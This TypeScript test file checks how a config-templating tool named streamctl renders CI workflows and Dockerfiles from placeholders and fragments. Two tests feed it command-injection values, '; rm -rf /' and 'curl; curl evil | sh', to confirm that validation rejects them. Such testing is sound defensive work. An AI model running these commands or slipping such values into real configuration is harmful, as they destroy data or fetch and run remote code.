import type { ManagedFile, StreamctlConfig } from "../src/config/types";
import type { RenderDef } from "../src/manifest/schema";
import type { PayloadHandle } from "../src/payload/resolve";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { validateStreamctlConfig } from "../src/config/validate";
import { detectDrift } from "../src/engine/drift";
import { isFileEnabled, readConfigPath, renderFile } from "../src/engine/render";
import { runSync } from "../src/engine/sync";
import { StreamctlError } from "../src/errors";

const cfg = (over: Partial<StreamctlConfig> = {}): StreamctlConfig => ({ package: "@x/config", base: "b", version: "1.0.0", profile: "nuxt-4", ...over });

describe("renderFile: placeholders", () => {
  it("substitutes a scalar config value, falling back to the default", () => {
    const def: RenderDef = { placeholders: { NODE: { configPath: "ci.nodeVersion", default: "24.13.0" } } };
    expect(renderFile("node: ${NODE}\n", def, cfg({ ci: { nodeVersion: "22.1.0" } }), {})).toBe("node: 22.1.0\n");
    expect(renderFile("node: ${NODE}\n", def, cfg(), {})).toBe("node: 24.13.0\n");
  });

  it("dedupes and sorts a string[], joining per `join`", () => {
    const spaceDef: RenderDef = { placeholders: { APT: { configPath: "aptPackages", default: "", join: "space" } } };
    expect(renderFile("ARG APT=\"${APT}\"\n", spaceDef, cfg({ aptPackages: ["zlib", "curl", "curl"] }), {})).toBe("ARG APT=\"curl zlib\"\n");

    const linesDef: RenderDef = { placeholders: { ENVS: { configPath: "aptPackages", default: "", join: "lines" } } };
    expect(renderFile("${ENVS}\n", linesDef, cfg({ aptPackages: ["b", "a"] }), {})).toBe("a\nb\n");
  });

  it("a value failing `pattern` raises CONFIG_INVALID naming file, placeholder and value", () => {
    const def: RenderDef = { placeholders: { NODE: { configPath: "ci.nodeVersion", default: "24.13.0", pattern: "^[0-9.]+$" } } };
    const error = (() => {
      try {
        renderFile("node: \"${NODE}\"\n", def, cfg({ ci: { nodeVersion: "; rm -rf /" } }), {}, ".github/workflows/ci.yaml");
      } catch (e) {
        return e;
      }
    })();
    expect(error).toBeInstanceOf(StreamctlError);
    expect((error as StreamctlError).code).toBe("CONFIG_INVALID");
    const details = (error as StreamctlError).details as { file: string; placeholder: string; value: string };
    expect(details.file).toBe(".github/workflows/ci.yaml");
    expect(details.placeholder).toBe("NODE");
    expect(details.value).toBe("; rm -rf /");
  });

  it("a value matching `pattern` substitutes normally", () => {
    const def: RenderDef = { placeholders: { NODE: { configPath: "ci.nodeVersion", default: "24.13.0", pattern: "^[0-9.]+$" } } };
    expect(renderFile("node: ${NODE}\n", def, cfg(), {})).toBe("node: 24.13.0\n");
  });

  it("rejects shell metacharacters in a space-joined value", () => {
    // No `pattern` on the placeholder: the CLI-side floor must still reject it.
    const def: RenderDef = { placeholders: { APT: { configPath: "aptPackages", default: "", join: "space" } } };
    const error = (() => {
      try {
        renderFile("RUN apt-get install ${APT}\n", def, cfg({ aptPackages: ["git", "curl; curl evil | sh"] }), {}, "Dockerfile");
      } catch (e) {
        return e;
      }
    })();
    expect(error).toBeInstanceOf(StreamctlError);
    expect((error as StreamctlError).code).toBe("CONFIG_INVALID");
    const details = (error as StreamctlError).details as { file: string; placeholder: string; value: string };
    expect(details.file).toBe("Dockerfile");
    expect(details.placeholder).toBe("APT");
    expect(details.value).toBe("curl; curl evil | sh");
  });

  it("clean package names pass through a space-joined value unchanged", () => {
    const def: RenderDef = { placeholders: { APT: { configPath: "aptPackages", default: "", join: "space" } } };
    const out = renderFile("RUN apt-get install ${APT}\n", def, cfg({ aptPackages: ["ca-certificates", "@scope/x", "lib.a-b_c+1", "git"] }), {});
    expect(out).toBe("RUN apt-get install @scope/x ca-certificates git lib.a-b_c+1\n");
  });

  // Same `$`-pattern hazard on the placeholder path. `$&` was the nastiest: it
  // re-expanded to the token itself, tripped the leftover-token guard, and surfaced
  // as a CONFIG_INVALID blaming the template rather than the value.
  it.each([
    { name: "$$", value: "a$$b" },
    { name: "$&", value: "a$&b" },
    { name: "$`", value: "a$`b" },
    { name: "$'", value: "a$'b" },
  ])("a placeholder value containing $name lands verbatim", ({ value }) => {
    const def: RenderDef = { placeholders: { TOKEN: { configPath: "ci.nodeVersion", default: "" } } };
    expect(renderFile("v: ${TOKEN}\n", def, cfg({ ci: { nodeVersion: value } }), {})).toBe(`v: ${value}\n`);
  });

  it("does not raise a bogus unresolved-token error for a `$&` value", () => {
    const def: RenderDef = { placeholders: { TOKEN: { configPath: "ci.nodeVersion", default: "" } } };
    // This used to throw CONFIG_INVALID ("unresolved render token ${TOKEN} remains")
    // because `$&` re-expanded the token back into the output.
    expect(() => renderFile("v: ${TOKEN}\n", def, cfg({ ci: { nodeVersion: "$&" } }), {}, "ci.yaml")).not.toThrow();
  });

  it("the shell-meta floor is scoped to space-joined values only", () => {
    // A `;` is harmless on its own line; it is not a shell interpolation there.
    const def: RenderDef = { placeholders: { ENVS: { configPath: "aptPackages", default: "", join: "lines" } } };
    expect(renderFile("${ENVS}\n", def, cfg({ aptPackages: ["A=1;2", "B=3"] }), {})).toBe("A=1;2\nB=3\n");
  });
});

describe("renderFile: fromDependency", () => {
  const def: RenderDef = { placeholders: { PRISMA: { configPath: "docker.prismaVersion", fromDependency: "prisma", default: "6.19.1" } } };
  // `docker` is a payload knob, not a CLI-universal key, so it reaches the engine the way a
  // real config does: through the loose stage-1 validation.
  const withDocker = (prismaVersion: string): StreamctlConfig => validateStreamctlConfig({ ...cfg(), docker: { prismaVersion } });
  const render = (config: StreamctlConfig, deps: Record<string, string>): string =>
    renderFile("ARG PRISMA_VERSION=${PRISMA}\n", def, config, {}, "Dockerfile", deps);

  it("prefers the config value over the dependency pin", () => {
    expect(render(withDocker("6.20.0"), { prisma: "^6.19.3" })).toBe("ARG PRISMA_VERSION=6.20.0\n");
  });

  it("prefers the dependency floor over the static default", () => {
    expect(render(cfg(), { prisma: "^6.19.3" })).toBe("ARG PRISMA_VERSION=6.19.3\n");
  });

  it("falls back to the default when the dependency is absent", () => {
    expect(render(cfg(), {})).toBe("ARG PRISMA_VERSION=6.19.1\n");
  });

  it("floors the common range spellings, prereleases included", () => {
    for (const [spec, expected] of [
      ["^6.19.3", "6.19.3"],
      ["~6.19.3", "6.19.3"],
      [">=6.19.3", "6.19.3"],
      ["6.19.1", "6.19.1"],
      ["v6.19.1", "6.19.1"],
      ["6.20.0-rc.1", "6.20.0-rc.1"],
      ["^6.20.0-rc.1", "6.20.0-rc.1"],
    ] as const) {
      expect(render(cfg(), { prisma: spec }), spec).toBe(`ARG PRISMA_VERSION=${expected}\n`);
    }
  });

  // A partial core would let the same commit render different bytes as the registry moves,
  // which breaks both image reproducibility and the `check` drift gate.
  it("falls back to the default for anything that is not a full triple", () => {
    for (const spec of ["^6", "~1.2", "6", "6.19", "*", "latest", "workspace:*", "file:../prisma", "npm:@acme/prisma@6.19.3", "git+https://github.com/prisma/prisma.git#v6.19.3"]) {
      expect(render(cfg(), { prisma: spec }), spec).toBe("ARG PRISMA_VERSION=6.19.1\n");
    }
  });

  it("validates `pattern` against the derived value like any other", () => {
    const patterned: RenderDef = {
      placeholders: { PRISMA: { configPath: "docker.prismaVersion", fromDependency: "prisma", default: "6.19.1", pattern: "^6\\.19\\.\\d+$" } },
    };
    const error = (() => {
      try {
        renderFile("ARG PRISMA_VERSION=${PRISMA}\n", patterned, cfg(), {}, "Dockerfile", { prisma: "^7.0.0" });
      } catch (e) {
        return e;
      }
    })();
    expect(error).toBeInstanceOf(StreamctlError);
    expect((error as StreamctlError).code).toBe("CONFIG_INVALID");
    expect((error as StreamctlError).details).toMatchObject({ file: "Dockerfile", placeholder: "PRISMA", value: "7.0.0" });
  });

  // Every existing caller omits the argument; it must resolve exactly as it did before.
  it("resolves to the default when the caller passes no deps at all", () => {
    expect(renderFile("ARG PRISMA_VERSION=${PRISMA}\n", def, cfg(), {})).toBe("ARG PRISMA_VERSION=6.19.1\n");
  });
});

describe("renderFile: fragments", () => {
  const frags = { a: "FRAG-A", b: "FRAG-B", c: "FRAG-C" };
  const def: RenderDef = {
    fragments: [
      { toggle: "ci.unitTests", source: "a" },
      { toggle: "ci.e2e", source: "b" },
      { toggle: "ci.migrationLint", source: "c" },
    ],
  };

  it("includes only toggled-on fragments", () => {
    expect(renderFile("BASE\n", def, cfg({ ci: { e2e: true } }), frags)).toBe("BASE\nFRAG-B\n");
    expect(renderFile("BASE\n", def, cfg(), frags)).toBe("BASE\n");
  });

  it("emits fragments in declared order, not config key order", () => {
    // Config lists migrationLint first, but the declared order is a, b, c.
    const out = renderFile("BASE\n", def, cfg({ ci: { migrationLint: true, e2e: true, unitTests: true } }), frags);
    expect(out).toBe("BASE\nFRAG-A\nFRAG-B\nFRAG-C\n");
  });

  it("forEach repeats a fragment per item, exposed as ${ITEM}", () => {
    const forEachDef: RenderDef = { fragments: [{ forEach: "ci.deploy", source: "job" }] };
    const out = renderFile("jobs:\n", forEachDef, cfg({ ci: { deploy: ["staging", "production", "staging"] } }), { job: "  deploy-${ITEM}:" });
    expect(out).toBe("jobs:\n  deploy-staging:\n  deploy-production:\n");
  });

  // `replaceAll` with a STRING replacement honors `$`-patterns in the replacement
  // ($$ becomes $, $& the matched token, $` the text before it). Config values are
  // data and must land byte-for-byte.
  it.each([
    { name: "$$ (would collapse to a single $)", item: "a$$b" },
    { name: "$& (would re-expand the token itself)", item: "a$&b" },
    { name: "$` (would splice in the preceding text)", item: "a$`b" },
    { name: "$' (would splice in the following text)", item: "a$'b" },
  ])("inserts a forEach item containing $name verbatim", ({ item }) => {
    const def: RenderDef = { fragments: [{ forEach: "ci.deploy", source: "job" }] };
    const out = renderFile("jobs:\n", def, cfg({ ci: { deploy: [item] } }), { job: "  deploy-${ITEM}:" });
    expect(out).toBe(`jobs:\n  deploy-${item}:\n`);
  });

  it("errors when a fragment's source content was not provided", () => {
    const error = (() => {
      try {
        renderFile("BASE\n", def, cfg({ ci: { unitTests: true } }), {}, "ci.yaml");
      } catch (e) {
        return e;
      }
    })();
    expect(error).toBeInstanceOf(StreamctlError);
    expect((error as StreamctlError).message).toContain("fragment source \"a\"");
  });
});

describe("renderFile: post-assembly substitution, passthrough, leftover guard", () => {
  it("placeholders are substituted after fragments are assembled", () => {
    const def: RenderDef = {
      placeholders: { NODE: { configPath: "ci.nodeVersion", default: "24.13.0" } },
      fragments: [{ toggle: "ci.unitTests", source: "job" }],
    };
    const out = renderFile("env: ${NODE}\n", def, cfg({ ci: { unitTests: true } }), { job: "with-node: ${NODE}" });
    expect(out).toBe("env: 24.13.0\nwith-node: 24.13.0\n");
  });

  it("never touches GitHub ${{ … }} expressions", () => {
    const def: RenderDef = { placeholders: { NODE: { configPath: "ci.nodeVersion", default: "24.13.0" } } };
    const out = renderFile("node: ${NODE}\nrunner: ${{ env.NODE_VERSION }}\n", def, cfg(), {});
    expect(out).toBe("node: 24.13.0\nrunner: ${{ env.NODE_VERSION }}\n");
  });

  it("an unresolved ${TOKEN} left after render means template/manifest drift", () => {
    const def: RenderDef = { placeholders: { NODE: { configPath: "ci.nodeVersion", default: "24.13.0" } } };
    const error = (() => {
      try {
        // ${PNPM} is never declared as a placeholder, so it survives as a leftover.
        renderFile("node: ${NODE}\npnpm: ${PNPM}\n", def, cfg(), {}, "ci.yaml");
      } catch (e) {
        return e;
      }
    })();
    expect(error).toBeInstanceOf(StreamctlError);
    expect((error as StreamctlError).code).toBe("CONFIG_INVALID");
    expect((error as StreamctlError).message).toContain("${PNPM}");
    expect((error as StreamctlError).message).toContain("ci.yaml");
  });

  it("flags only the real token when a GitHub expression sits next to it", () => {
    const error = (() => {
      try {
        renderFile("keep: ${{ env.X }}\ndrift: ${GONE}\n", {}, cfg(), {}, "f");
      } catch (e) {
        return e;
      }
    })();
    expect((error as StreamctlError).details).toMatchObject({ token: "${GONE}" });
  });

  it("a ${TOKEN} declared in passthrough survives verbatim", () => {
    // ${PRISMA_VERSION} is a Dockerfile build-ARG the renderer must NOT touch.
    const def: RenderDef = { passthrough: ["PRISMA_VERSION"] };
    expect(renderFile("RUN npm i -D prisma@${PRISMA_VERSION}\n", def, cfg(), {})).toBe("RUN npm i -D prisma@${PRISMA_VERSION}\n");
  });

  it("passthrough is exact: any other leftover still fails", () => {
    const def: RenderDef = { passthrough: ["KEEP"] };
    expect(renderFile("a: ${KEEP}\n", def, cfg(), {})).toBe("a: ${KEEP}\n");
    const error = (() => {
      try {
        renderFile("a: ${KEEP}\nb: ${NOPE}\n", def, cfg(), {}, "f");
      } catch (e) {
        return e;
      }
    })();
    expect((error as StreamctlError).details).toMatchObject({ token: "${NOPE}" });
  });

  it("nothing to render leaves the source alone, bar a trailing newline", () => {
    const source = "line1\nline2\n";
    expect(renderFile(source, {}, cfg(), {})).toBe(source);
    expect(renderFile("only line", {}, cfg(), {})).toBe("only line\n");
  });
});

describe("readConfigPath / isFileEnabled", () => {
  it("reads nested dot-paths and returns undefined for missing segments", () => {
    expect(readConfigPath(cfg({ ci: { e2e: true } }), "ci.e2e")).toBe(true);
    expect(readConfigPath(cfg(), "ci.e2e")).toBeUndefined();
    expect(readConfigPath(cfg(), "nope.deep.path")).toBeUndefined();
  });

  it("gates a file on its enabledBy boolean", () => {
    const gated: ManagedFile = { path: "x", strategy: "full", source: "s", enabledBy: "ci.e2e" };
    const plain: ManagedFile = { path: "y", strategy: "full", source: "s" };
    expect(isFileEnabled(gated, cfg({ ci: { e2e: true } }))).toBe(true);
    expect(isFileEnabled(gated, cfg({ ci: { e2e: false } }))).toBe(false);
    expect(isFileEnabled(gated, cfg())).toBe(false);
    expect(isFileEnabled(plain, cfg())).toBe(true);
  });
});

describe("enabledBy exclusion in the plan", () => {
  const payload: PayloadHandle = {
    version: "1.0.0",
    async read(source) {
      const entries: Record<string, string> = { always: "ALWAYS\n", gated: "GATED\n" };
      const content = entries[source];
      if (content === undefined) {
        throw new Error(`missing fixture source: ${source}`);
      }
      return content;
    },
    async list() {
      return [];
    },
  };
  const files: ManagedFile[] = [
    { path: "always.txt", strategy: "full", source: "always" },
    { path: "gated.txt", strategy: "full", source: "gated", enabledBy: "ci.e2e" },
  ];

  let cwd: string;
  beforeEach(async () => {
    cwd = await mkdtemp(join(tmpdir(), "streamctl-enabledby-"));
  });
  afterEach(async () => {
    await rm(cwd, { recursive: true, force: true });
  });

  it("a disabled file is neither planned, written, nor drift", async () => {
    const config = cfg({ ci: { e2e: false } });
    const result = await runSync({ cwd, payload, config, managedFiles: files });
    expect(result.written).toEqual(["always.txt"]);
    expect(result.skipped).toContain("gated.txt");
    expect(await readFile(join(cwd, "gated.txt")).catch(() => null)).toBeNull();
    // The absent gated file must not read as missing-file drift.
    expect(await detectDrift(files, payload, config, cwd)).toEqual({ inSync: true, drift: [], structuralFaults: [] });
  });

  it("enabledBy true means the file is planned and written", async () => {
    const config = cfg({ ci: { e2e: true } });
    const result = await runSync({ cwd, payload, config, managedFiles: files });
    expect(result.written).toEqual(expect.arrayContaining(["always.txt", "gated.txt"]));
    expect(await readFile(join(cwd, "gated.txt"), "utf8")).toBe("GATED\n");
  });
});

// The deploy workflow must render byte-identically through the generic renderer:
// base, then one job per env in config order, with ${ITEM} substituted.

const DEPLOY_JOB = `  deploy-\${ITEM}:
    runs-on: ubuntu-latest
    environment: \${ITEM}
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
        with:
          version: \${{ env.PNPM_VERSION }}
      - uses: actions/setup-node@v4
        with:
          node-version: \${{ env.NODE_VERSION }}
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm build`;

describe("generic forEach deploy assembly", () => {
  const DEPLOY_BASE = "name: Deploy\non:\n  push:\njobs:\n";
  const deployDef: RenderDef = { fragments: [{ forEach: "ci.deploy", source: "job" }] };
  const deployFrags = { job: DEPLOY_JOB };

  // The expected assembly, built without the renderer: base with its trailing newline
  // stripped, then one ${ITEM}-substituted job per env in config order, `\n`-joined,
  // one trailing \n.
  const expectedFor = (envs: string[]): string =>
    `${DEPLOY_BASE.replace(/\n+$/, "")}\n${envs.map(env => DEPLOY_JOB.replaceAll("${ITEM}", env)).join("\n")}\n`;

  for (const list of [["staging"], ["staging", "production"], ["staging", "production", "pr-preview"]]) {
    it(`deploy [${list.join(",")}] assembles byte-exactly`, () => {
      expect(renderFile(DEPLOY_BASE, deployDef, cfg({ ci: { deploy: list } }), deployFrags)).toBe(expectedFor(list));
    });
  }

  it("forEach preserves config order, the generic renderer never reorders", () => {
    const out = renderFile(DEPLOY_BASE, deployDef, cfg({ ci: { deploy: ["production", "staging"] } }), deployFrags);
    expect(out.indexOf("deploy-production")).toBeLessThan(out.indexOf("deploy-staging"));
    expect(out).toBe(expectedFor(["production", "staging"]));
  });
});
